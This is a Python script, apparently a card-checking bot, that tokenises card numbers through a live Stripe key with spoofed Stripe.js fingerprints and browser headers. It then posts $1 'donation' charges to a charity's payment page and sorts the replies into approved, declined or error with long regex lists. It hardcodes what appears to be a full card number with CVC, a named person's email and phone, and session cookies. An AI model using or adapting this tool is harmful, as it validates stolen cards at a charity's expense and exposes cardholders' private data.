import requests
import re
from urllib.parse import urlencode


BASE_URL = 'https://adath.com'
STRIPE_API_URL = 'https://api.stripe.com/v1/tokens'
STRIPE_PUBLIC_KEY = 'pk_live_hfa8n6GiIulubXWLlxKFT2Nk00HemDDv0u'


COOKIES = {
    '__stripe_mid': 'cdc6ea00-7762-43da-a1bb-b10923dba546de8064',
    '__stripe_sid': '23d876f1-1b02-48cf-8586-d027b4ac899e30c670'
}


CARD = {'number': '4492789672956138', 'cvc': '641', 'exp_month': '02', 'exp_year': '29'}
CUSTOMER = {'first_name': 'SAIMON', 'last_name': 'DIVES', 'email': 'saimondives@gmail.com', 'phone': '9058782725'}
METADATA = {'guid': '190ef75c-e3c2-49d8-997a-68fcaae4c3ec56deea', 'muid': 'cdc6ea00-7762-43da-a1bb-b10923dba546de8064', 'sid': '23d876f1-1b02-48cf-8586-d027b4ac899e30c670'}

session = requests.Session()

def check_card(cc_number, exp_month, exp_year, cvv):
    """Check a single card - main function for bot integration"""
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    token_result = get_stripe_token_dynamic(cc_number, exp_month, exp_year, cvv)
    
    if not token_result['success']:
        return {
            'status': 'ERROR',
            'message': token_result['error'],
            'card': f"{cc_number[:6]}****{cc_number[-4:]}"
        }
    
    charge_result = submit_charge(token_result['token'])
    charge_result['card'] = f"{cc_number[:6]}****{cc_number[-4:]}"
    return charge_result

def get_stripe_token_dynamic(cc_number, exp_month, exp_year, cvv):
    """Get Stripe token for dynamic card data"""
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    data = {
        'guid': METADATA['guid'],
        'muid': METADATA['muid'],
        'sid': METADATA['sid'],
        'referrer': BASE_URL,
        'time_on_page': '330450',
        'card[number]': cc_number,
        'card[cvc]': cvv,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'payment_user_agent': 'stripe.js/9390d43c1d; stripe-js-v3/9390d43c1d; card-element',
        'key': STRIPE_PUBLIC_KEY
    }
    
    try:
        response = session.post(STRIPE_API_URL, data=urlencode(data), headers=headers, timeout=15)
        
        if response.status_code == 200:
            result = response.json()
            if 'id' in result:
                return {'success': True, 'token': result['id']}
            return {'success': False, 'error': 'No token in response'}
        else:
            error_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
            error_msg = error_data.get('error', {}).get('message', response.text[:200])
            return {'success': False, 'error': error_msg}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def get_stripe_token():
    """Get Stripe token for card"""
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    data = {
        'guid': METADATA['guid'],
        'muid': METADATA['muid'],
        'sid': METADATA['sid'],
        'referrer': BASE_URL,
        'time_on_page': '330450',
        'card[number]': CARD['number'],
        'card[cvc]': CARD['cvc'],
        'card[exp_month]': CARD['exp_month'],
        'card[exp_year]': CARD['exp_year'],
        'payment_user_agent': 'stripe.js/9390d43c1d; stripe-js-v3/9390d43c1d; card-element',
        'key': STRIPE_PUBLIC_KEY
    }
    
    try:
        response = session.post(STRIPE_API_URL, data=urlencode(data), headers=headers, timeout=15)
        
        if response.status_code == 200:
            result = response.json()
            if 'id' in result:
                return {'success': True, 'token': result['id']}
            return {'success': False, 'error': 'No token in response'}
        else:
            error_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
            error_msg = error_data.get('error', {}).get('message', response.text[:200])
            return {'success': False, 'error': error_msg}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def submit_charge(stripe_token):
    """Submit charge with token and detect response"""
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': BASE_URL,
        'Referer': f'{BASE_URL}/pay/donate',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    charge_data = {
        'first-name': CUSTOMER['first_name'],
        'last-name': CUSTOMER['last_name'],
        'email': CUSTOMER['email'],
        'phone': CUSTOMER['phone'],
        'amount': '$1.00',
        'note': 'happy??',
        'description': 'Donation',
        'stripeToken': stripe_token,
        'test': '1'
    }
    
    try:
        response = session.post(f'{BASE_URL}/pay/charge', data=charge_data, headers=headers, cookies=COOKIES, timeout=15)
        return detect_payment_result(response.text, response.status_code)
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e)}

def detect_payment_result(html, status_code):
    """Advanced payment result detection"""
    html_lower = html.lower()
    
    # Success patterns - comprehensive
    success_patterns = [
        # Thank you messages
        r'thank\s*you\s*(for|!|so much)',
        r'thanks\s*(for\s*your|!|so much)',
        r'muchas\s*gracias',
        r'merci',
        # Payment success
        r'payment\s*(was\s*)?(successful|approved|accepted|complete|confirmed|processed)',
        r'transaction\s*(was\s*)?(successful|approved|accepted|complete|confirmed|processed)',
        r'charge\s*(was\s*)?(successful|approved|accepted|complete|confirmed|processed)',
        r'donation\s*(was\s*)?(successful|approved|accepted|complete|confirmed|received|processed)',
        r'order\s*(was\s*)?(successful|approved|accepted|complete|confirmed|placed|processed)',
        r'purchase\s*(was\s*)?(successful|approved|accepted|complete|confirmed|processed)',
        # Successfully messages
        r'successfully\s*(charged|processed|completed|submitted|received|paid|placed)',
        r'has\s*been\s*(charged|processed|completed|submitted|received|accepted|placed)',
        r'payment\s*has\s*been\s*(processed|received|accepted|confirmed|made)',
        r'your\s*(payment|donation|order|purchase)\s*(has\s*been\s*)?(processed|received|accepted|confirmed)',
        r'we\s*(have\s*)?(received|processed|accepted)\s*your\s*(payment|donation|order)',
        # Confirmation messages
        r'confirmation\s*(number|#|code|id)',
        r'transaction\s*(id|#|number|code)',
        r'receipt\s*(number|#|id|code)',
        r'reference\s*(number|#|id|code)',
        r'order\s*(number|#|id|code)',
        r'booking\s*(number|#|id|code|reference)',
        r'authorization\s*(code|number|id)',
        r'auth\s*code',
        # Status indicators
        r'status["\':>\s]*(approved|success|paid|complete|succeeded|authorized)',
        r'"status"\s*:\s*"(succeeded|paid|approved|complete|success|authorized)"',
        r'payment_status["\':>\s]*(approved|success|paid|complete)',
        r'state["\':>\s]*(approved|success|paid|complete|succeeded)',
        # Card approved
        r'card\s*(was\s*)?(approved|accepted|authorized)',
        r'authorization\s*(was\s*)?(successful|approved|granted)',
        r'authorized',
        # Email/receipt sent
        r'(confirmation|receipt)\s*(email|has been|will be)\s*sent',
        r'we.ve\s*sent\s*(you\s*)?(a\s*)?(confirmation|receipt|email)',
        r'check\s*your\s*(email|inbox)',
        r'email\s*(confirmation|receipt)\s*sent',
        # Amount charged
        r'charged\s*\$',
        r'amount\s*(charged|paid|received)',
        r'you\s*(have\s*been|were)\s*charged',
        r'total\s*(charged|paid)',
        r'\$[\d,]+\.?\d*\s*(charged|paid|received|processed)',
        # Paid indicators
        r'"paid"\s*:\s*true',
        r'paid\s*(successfully|in full)',
        r'payment\s*captured',
        r'funds\s*(received|captured|collected)',
        r'money\s*(received|collected)',
        # Appreciation
        r'we\s*appreciate\s*your',
        r'your\s*(support|generosity|contribution)',
        r'god\s*bless',
        # Completion messages
        r'all\s*done',
        r'you.re\s*(all\s*)?set',
        r'completed\s*successfully',
        r'processing\s*complete',
        r'transaction\s*complete',
        # Success page indicators
        r'class="success"',
        r'class="approved"',
        r'class="confirmed"',
        r'id="success"',
        r'success-message',
        r'payment-success',
        r'checkout-success',
        # Generic approved
        r'approved',
        r'succeeded',
        r'accepted',
        # Donation-specific patterns
        r'thank\s*you\s*for\s*(your\s*)?(donation|contribution|gift|giving|generosity|support)',
        r'donation\s*(has\s*been\s*)?(received|accepted|confirmed|recorded|processed)',
        r'gift\s*(has\s*been\s*)?(received|accepted|confirmed|recorded|processed)',
        r'contribution\s*(has\s*been\s*)?(received|accepted|confirmed|recorded|processed)',
        r'tax\s*deductible',
        r'tax\s*receipt',
        r'charitable\s*(contribution|donation|gift)',
        r'we\s*are\s*grateful',
        r'grateful\s*for\s*(your|the)',
        r'bless(ing|ed)?',
        r'may\s*(god|hashem|the\s*lord)',
        r'donor',
        r'giving\s*(record|history|confirmed)',
        r'tzedakah',
        r'mitzvah',
        r'mazel\s*tov'
    ]
    
    # Decline patterns - comprehensive (card rejected by bank/processor)
    decline_patterns = [
        # Standard decline messages
        r'card\s*(was\s*)?(declined|rejected|refused|denied)',
        r'payment\s*(was\s*)?(declined|rejected|refused|denied)',
        r'transaction\s*(was\s*)?(declined|rejected|refused|denied)',
        r'charge\s*(was\s*)?(declined|rejected|refused|denied)',
        r'your\s*card\s*(was\s*)?(declined|rejected|refused)',
        r'card_declined',
        r'payment_declined',
        # Insufficient funds
        r'insufficient\s*funds',
        r'do\s*not\s*honor',
        r'do_not_honor',
        r'not\s*sufficient\s*funds',
        r'over\s*(the\s*)?limit',
        r'credit\s*limit',
        r'exceeds\s*(balance|limit)',
        # Card issues
        r'lost\s*card',
        r'stolen\s*card',
        r'pickup\s*card',
        r'restricted\s*card',
        # Fraud/security
        r'security\s*violation',
        r'fraudulent',
        r'suspected\s*fraud',
        r'high\s*risk',
        r'blocked',
        r'blacklisted',
        # Bank/issuer
        r'try\s*(a\s*)?different\s*card',
        r'contact\s*your\s*(bank|card\s*issuer)',
        r'bank\s*declined',
        r'issuer\s*declined',
        r'generic_decline',
        r'call_issuer',
        # Card number invalid/incorrect (DECLINE not error)
        r'card\s*number\s*(is\s*)?(invalid|incorrect|wrong)',
        r'your\s*card\s*number\s*(is\s*)?(invalid|incorrect|wrong)',
        r'invalid\s*card\s*number',
        r'incorrect\s*card\s*number',
        r'number\s*(is\s*)?(invalid|incorrect|not valid)',
        r'not\s*a\s*valid\s*(card|number)',
        r'enter\s*a\s*valid\s*(card|number)',
        r'invalid\s*card',
        r'incorrect\s*card',
        # CVC/CVV invalid (DECLINE)
        r'cvc\s*(is\s*)?(invalid|incorrect|wrong)',
        r'cvv\s*(is\s*)?(invalid|incorrect|wrong)',
        r'security\s*code\s*(is\s*)?(invalid|incorrect|wrong)',
        r"your\s*card's?\s*(cvc|cvv|security\s*code)",
        r'cvc\s*(check\s*)?(failed|invalid|incorrect)',
        r'cvv\s*(check\s*)?(failed|invalid|incorrect)',
        r'invalid\s*(cvc|cvv)',
        r'incorrect\s*(cvc|cvv)',
        # Expiration invalid (DECLINE)
        r'expired\s*card',
        r'card\s*(has\s*)?expired',
        r'your\s*card\s*(has\s*)?expired',
        r'expiration\s*(date\s*)?(invalid|incorrect|wrong)',
        r'expir(y|ation)\s*(is\s*)?(invalid|incorrect|wrong|past)',
        r"card's?\s*expiration",
        r'invalid\s*expir',
        r'incorrect\s*expir',
        # Zip/postal mismatch (DECLINE)
        r'zip\s*(code\s*)?(is\s*)?(invalid|incorrect|mismatch|wrong)',
        r'postal\s*(code\s*)?(is\s*)?(invalid|incorrect|mismatch|wrong)',
        r'address\s*(verification\s*)?(failed|mismatch)',
        r'avs\s*(check\s*)?failed',
        # Card details wrong
        r'card\s*details\s*(are\s*)?(incorrect|invalid|wrong)',
        r'check\s*your\s*card\s*(number|details)',
        r'verify\s*your\s*card',
        r'card\s*(was\s*)?(not\s*)?(valid|accepted)',
        # Generic decline
        r'declined'
    ]
    
    # Error patterns - system/technical errors only (not card validation)
    error_patterns = [
        # Processing/system errors
        r'processing\s*error',
        r'gateway\s*error',
        r'connection\s*error',
        r'timeout',
        r'server\s*error',
        r'internal\s*error',
        r'an\s*error\s*(has\s*)?occurred',
        r'something\s*went\s*wrong',
        r'could\s*not\s*(process|complete|connect)',
        r'failed\s*to\s*(connect|load|process)',
        r'unable\s*to\s*(connect|process)',
        r'please\s*try\s*again\s*later',
        r'service\s*(unavailable|down)',
        r'maintenance',
        # PHP/server errors
        r'<b>notice</b>',
        r'<b>error</b>',
        r'<b>warning</b>',
        r'<b>fatal</b>',
        r'undefined\s*(index|variable)',
        r'exception',
        r'stack\s*trace',
        r'parse\s*error',
        r'syntax\s*error',
        # Stripe API errors (not card errors)
        r'api_error',
        r'rate_limit',
        r'api_connection_error',
        r'authentication_error',
        r'invalid_request_error',
        # Network errors
        r'network\s*error',
        r'dns\s*error',
        r'ssl\s*error',
        r'certificate\s*error'
    ]
    
    # Check DECLINE first (priority)
    for pattern in decline_patterns:
        if re.search(pattern, html_lower):
            # Try to extract full decline message
            decline_msg_patterns = [
                r'your\s*card\s*number\s*is\s*incorrect',
                r'your\s*card\s*has\s*expired',
                r"your\s*card's?\s*(cvc|cvv|security\s*code)[^<\.]{0,50}",
                r'your\s*card\s*was\s*(declined|rejected)[^<\.]{0,50}',
                r'card\s*number\s*(is\s*)?(invalid|incorrect|wrong)',
                r'(cvc|cvv|security\s*code)\s*(is\s*)?(invalid|incorrect|wrong)',
                r'expir(y|ation)\s*(date\s*)?(is\s*)?(invalid|incorrect|wrong|past)',
                r'(card|payment|transaction)\s*(was\s*)?(declined|rejected|refused)[^<\.]{0,50}',
                r'insufficient\s*funds',
                r'do\s*not\s*honor',
                r'(declined|insufficient|do not honor|rejected|refused|denied|blocked|fraud|risk|limit|lost|stolen|expired|invalid|incorrect)[^<\.]{0,50}'
            ]
            reason = None
            for msg_pattern in decline_msg_patterns:
                match = re.search(msg_pattern, html_lower)
                if match:
                    reason = match.group(0).strip()[:100]
                    break
            if not reason:
                reason = 'Card declined'
            return {'status': 'DECLINED', 'message': reason.capitalize()}
    
    # Check ERROR second
    for pattern in error_patterns:
        if re.search(pattern, html_lower):
            # Try to extract the full error message with multiple patterns
            error_msg_patterns = [
                r'your\s*card\s*number\s*is\s*incorrect',
                r'your\s*card\s*has\s*expired',
                r"your\s*card's?\s*(cvc|cvv|security\s*code)[^<\.]{0,50}",
                r'your\s*card\s*was\s*(declined|rejected)[^<\.]{0,50}',
                r'card\s*number\s*(is\s*)?(invalid|incorrect|wrong)',
                r'(cvc|cvv|security\s*code)\s*(is\s*)?(invalid|incorrect|wrong)',
                r'expir(y|ation)\s*(date\s*)?(is\s*)?(invalid|incorrect|wrong|past)',
                r'(invalid|incorrect|wrong)\s*(card|cvc|cvv|expir|zip|number)[^<\.]{0,30}',
                r'please\s*(check|verify|enter)[^<\.]{0,50}',
                r'(error|invalid|incorrect|failed|expired|unable)[^<\.]{0,80}'
            ]
            reason = None
            for msg_pattern in error_msg_patterns:
                match = re.search(msg_pattern, html_lower)
                if match:
                    reason = match.group(0).strip()[:100]
                    break
            if not reason:
                reason = 'Processing error'
            return {'status': 'ERROR', 'message': reason.capitalize()}
    
    # Check SUCCESS last (avoid false positives)
    for pattern in success_patterns:
        if re.search(pattern, html_lower):
            if not re.search(r'(declined|failed|error|invalid|rejected)', html_lower):
                tx_match = re.search(r'(transaction|confirmation|receipt|order|reference)[_\s]*(id|number|#)?[:\s]*([A-Za-z0-9_-]+)', html_lower)
                if tx_match:
                    return {'status': 'APPROVED', 'message': f'Payment successful - ID: {tx_match.group(3)}'}
                return {'status': 'APPROVED', 'message': 'Payment successful'}
    
    # HTTP status check
    if status_code >= 500:
        return {'status': 'ERROR', 'message': f'Server error (HTTP {status_code})'}
    if status_code >= 400:
        return {'status': 'ERROR', 'message': f'Request error (HTTP {status_code})'}
    
    return {'status': 'UNKNOWN', 'message': 'Could not determine payment result'}

def main():
    print("=" * 60)
    print("PAYMENT AUTOMATION")
    print("=" * 60)
    print(f"Card: {CARD['number'][:4]}****{CARD['number'][-4:]}")
    print(f"Customer: {CUSTOMER['first_name']} {CUSTOMER['last_name']}")
    print(f"Amount: $1.00")
    print("-" * 60)
    

    print("\n[1] Getting Stripe token...")
    token_result = get_stripe_token()
    
    if not token_result['success']:
        print(f"[X] Token failed: {token_result['error']}")
        return
    
    print(f"[✓] Token: {token_result['token']}")
    

    print("\n[2] Submitting charge...")
    charge_result = submit_charge(token_result['token'])
    
 
    print("\n" + "=" * 60)
    print("RESULT:")
    print("=" * 60)
    print(f"Status: {charge_result['status']}")
    print(f"Message: {charge_result['message']}")
    print("=" * 60)

if __name__ == "__main__":
    main()
